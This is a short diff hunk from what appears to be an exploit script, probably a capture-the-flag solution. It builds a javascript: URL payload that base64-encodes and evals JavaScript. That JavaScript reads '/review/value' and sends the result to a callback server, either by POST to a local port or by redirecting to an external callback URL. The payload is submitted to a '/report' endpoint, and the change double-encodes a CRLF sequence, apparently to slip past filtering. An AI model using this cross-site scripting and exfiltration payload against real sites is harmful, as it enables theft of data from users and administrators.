@@ -101,7 +101,7 @@ async function main() {
     ? `fetch('/review/value').then(r=>r.text()).then(t=>fetch('http://127.0.0.1:${localCallback.port}${localCallback.path}',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:t}))`
     : `fetch('/review/value').then(r=>r.text()).then(t=>location=${JSON.stringify(callbackBase)}+'/?'+btoa(${JSON.stringify(collectionNonce)}+':'+t))`;
   const encoded = Buffer.from(js).toString('base64');
-  const payload = `javascript://admin.pk/;%0D%0A;eval(atob('${encoded}'))\",\"username\":\"admin\",\"pass\":\"P@ss`;
+  const payload = `javascript://admin.pk/;%250D%250A;eval(atob('${encoded}'))\",\"username\":\"admin\",\"pass\":\"P@ss`;
 
   await request('POST', '/report', {
     body: form({ parameters: payload }),
